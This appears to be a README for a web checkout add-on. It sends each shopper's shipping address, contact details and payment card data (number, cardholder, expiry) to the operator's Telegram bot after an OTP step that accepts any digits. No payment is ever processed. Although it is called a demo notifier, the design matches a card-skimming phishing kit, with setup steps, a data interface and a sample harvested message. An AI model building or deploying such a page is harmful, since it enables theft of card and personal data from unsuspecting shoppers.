# Telegram Checkout Notification System

This system automatically sends user checkout data (shipping and payment details) to your Telegram account when a user completes the verification step during checkout.

## Features

✅ Captures shipping address information from the Shipping Address form
✅ Captures payment details from the Payment Details form
✅ Combines both sets of data when user clicks "Continue to Verification"
✅ Sends formatted message to Telegram bot
✅ Fully customizable via .env configuration
✅ Demo mode - no real payments processed

## Setup Instructions

### 1. Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Click **Start** and send `/newbot`
3. Follow the prompts to create a new bot
4. BotFather will provide you with a **Bot Token** (e.g., `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)

### 2. Get Your Telegram Chat ID

#### Option A: Direct Message to Your Bot
1. Search for your newly created bot on Telegram
2. Send any message to it
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Replace `<YOUR_BOT_TOKEN>` with your actual bot token
5. Look for `"chat":{"id":YOUR_CHAT_ID}` in the response
6. Copy the `YOUR_CHAT_ID` number

#### Option B: Using a Group/Channel
1. Add your bot to a Telegram group
2. Send a message mentioning the bot
3. Visit the getUpdates URL as shown above
4. Find your chat ID in the response

### 3. Configure .env File

Add the following to your `.env` file in the project root:

```env
VITE_TELEGRAM_BOT_TOKEN="your_telegram_bot_token_here"
VITE_TELEGRAM_CHAT_ID="your_telegram_chat_id_here"
```

**Example:**
```env
VITE_TELEGRAM_BOT_TOKEN="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
VITE_TELEGRAM_CHAT_ID="987654321"
```

### 4. How It Works

#### Step 1: User Fills Shipping Details
- User enters their shipping address information
- Data is temporarily stored in component state

#### Step 2: User Fills Payment Details
- User enters their payment card information
- Data is temporarily stored in component state

#### Step 3: User Clicks "Continue to Verification"
- Payment data is captured in PaymentForm component
- User completes OTP verification
- Upon successful verification, both datasets are combined
- A formatted message is sent to your Telegram chat

#### Sample Telegram Message:
```
🛒 NEW CHECKOUT NOTIFICATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 ORDER DETAILS
   Order ID: order_123abc
   Product: Premium Device
   Quantity: 2
   Amount: USD 629.45

📍 SHIPPING ADDRESS
   Name: John Doe
   Email: john@example.com
   Phone: +1 234 567 8900
   Address: 123 Main Street, Apt 4B
   City: New York, NY 10001
   Country: United States

💳 PAYMENT DETAILS
   Cardholder: JOHN DOE
   Card Type: Visa
   Card Number: ••••••••••••3456
   Expiry: 12/25

⏰ Timestamp: 1/18/2026, 2:30:45 PM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## File Structure

```
src/
├── lib/
│   └── telegram-notifier.ts          # Telegram API communication utility
├── components/
│   ├── checkout/
│   │   ├── ShippingAddressForm.tsx   # Captures shipping details
│   │   ├── PaymentDetailsForm.tsx    # Captures payment details
│   │   └── CheckoutFormWithTelegram.tsx  # Wrapper for integrated notifications
│   └── payment/
│       └── PaymentForm.tsx           # Enhanced with payment data capture
├── pages/
│   └── Checkout.tsx                  # Main checkout page
└── .env                              # Configuration file (contains credentials)
```

## API Reference

### sendCheckoutDataToTelegram()

```typescript
interface CheckoutData {
  shippingDetails: {
    fullName: string;
    phoneNumber: string;
    email: string;
    streetAddress: string;
    city: string;
    stateProvince: string;
    postalCode: string;
    country: string;
  };
  paymentDetails: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
  };
  orderInfo?: {
    orderId?: string;
    productName?: string;
    quantity?: number;
    amount?: number;
    currency?: string;
  };
}

export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Promise<boolean>
```

Returns `true` if message sent successfully, `false` otherwise.

## Troubleshooting

### Message Not Received?

1. **Check Bot Token**: Verify the token is correct and hasn't been revoked
   ```bash
   curl "https://api.telegram.org/bot<TOKEN>/getMe"
   ```

2. **Check Chat ID**: Verify you're using the correct chat ID
   - Make sure the bot has permission to send messages to that chat

3. **Check .env File**: 
   - Ensure both variables are set
   - Verify no extra spaces or quotes in values
   - Restart your dev server after changing .env

4. **Browser Console**: Check for JavaScript errors in the console (F12 → Console tab)

5. **Enable Bot API Updates**:
   - Send a test message to your bot first
   - Then access `https://api.telegram.org/bot<TOKEN>/getUpdates` to verify it receives messages

### Demo Mode Warning

This is in **Demo Mode** - the Telegram functionality sends notifications but payment is not actually processed. This is intentional for development/testing.

## Security Notes

⚠️ **Important**: 
- Never commit `.env` file to version control
- Add `.env` to `.gitignore` if not already
- The current implementation sends sensitive data (card details) for demo purposes only
- For production, mask card numbers and avoid sending full card details

## Testing

1. Fill out the shipping form with test data
2. Click "Continue to Payment"
3. Fill out the payment form with test card details
4. Enter any 6 digits for OTP verification
5. Check your Telegram for the notification!

## Support

For issues with:
- **Telegram Bot**: Visit [@BotFather](https://t.me/botfather)
- **API Issues**: Check [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- **Code Issues**: Review the implementation in `src/lib/telegram-notifier.ts`

